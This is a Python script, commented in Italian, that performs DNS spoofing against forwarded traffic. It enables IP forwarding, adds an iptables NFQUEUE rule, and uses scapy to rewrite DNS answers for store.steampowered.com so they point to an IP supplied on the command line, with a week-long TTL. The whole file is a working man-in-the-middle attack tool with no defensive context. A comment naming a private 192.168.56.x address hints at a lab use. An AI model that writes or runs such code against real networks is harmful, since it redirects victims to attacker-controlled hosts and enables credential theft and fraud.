from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import argparse

parser = argparse.ArgumentParser(
    description="Tool to execute DNS poisoning"
)

parser.add_argument(
    "-i",
    "--ip",
    dest="ip",
    help="IP address to spoof",
    type=str,
)

args = parser.parse_args()

if not args.ip:
    print("IP required!")
    parser.print_help()
    sys.exit(1)

dns_hosts = {
    b"store.steampowered.com.": args.ip
}

def process_packet(packet):
    # Converte il pacchetto di NetfilterQueue in un pacchetto Scapy
    scapy_packet = IP(packet.get_payload())    
    # Se il pacchetto è un DNS Resource Record (DNS reply)
    if scapy_packet.haslayer(DNSRR):
        print("[Before]:", scapy_packet.summary()) 	
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # non è un pacchetto UDP this (pacchetti IPerror/UDPerror)
            pass
        
        print("[After]:", scapy_packet.summary())
        # riconverte il pacchetto a NetfilterQueue
        packet.set_payload(bytes(scapy_packet))
    packet.accept()

def modify_packet(packet):
    
    # Prende il DNS Quetion Name (dominio)
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("The packet hasn't been motified:", qname)
        return packet
    # store.steampowered.com sarà mappato a 192.168.56.102
    # TTL: 7 giorni
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname], ttl=604800) 
    # Answer count a 1
    packet[DNS].ancount = 1
    # Checksum e lunghezza vengono eliminati per essere ri-calcolati automaticamente (da Scapy)
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    return packet

def main():
    QUEUE_NUM = 0       # ID della coda
    # Setup del forwarding di pacchetti IP
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # Viene inserita una FORWARD rule come richiesto dalla libreria NetfilterQueue
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    print("Iptables rule updated.")
    # Viene inizializzato un oggetto NetfilterQueue
    queue = NetfilterQueue()
    try:
        # Ogni pacchetto che arriva nella queue sarà processato
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        
if __name__ == "__main__":
    main()
    
